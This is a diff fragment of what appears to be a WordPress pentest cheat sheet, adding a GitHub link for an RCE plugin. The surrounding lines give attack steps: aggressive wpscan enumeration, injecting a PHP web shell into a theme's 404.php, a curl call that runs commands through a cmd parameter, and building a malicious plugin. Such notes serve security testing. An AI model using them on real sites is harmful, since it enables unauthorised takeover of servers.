@@ -2007,7 +2007,7 @@ wpscan --url http://$IP -e ap --plugins-detection aggressive
 # Dashboard → Appearance → Theme Editor → 404.php → Add PHP shell → save
 curl "http://$IP/wp-content/themes/THEME/404.php?cmd=id"
 
-# Method 2: Plugin upload
+# Method 2: Plugin upload // https://github.com/xanhacks/wordpress-rce-plugin/
 # Dashboard → Plugins → Add New → Upload Plugin
 # Create malicious plugin zip:
 mkdir mal_plugin
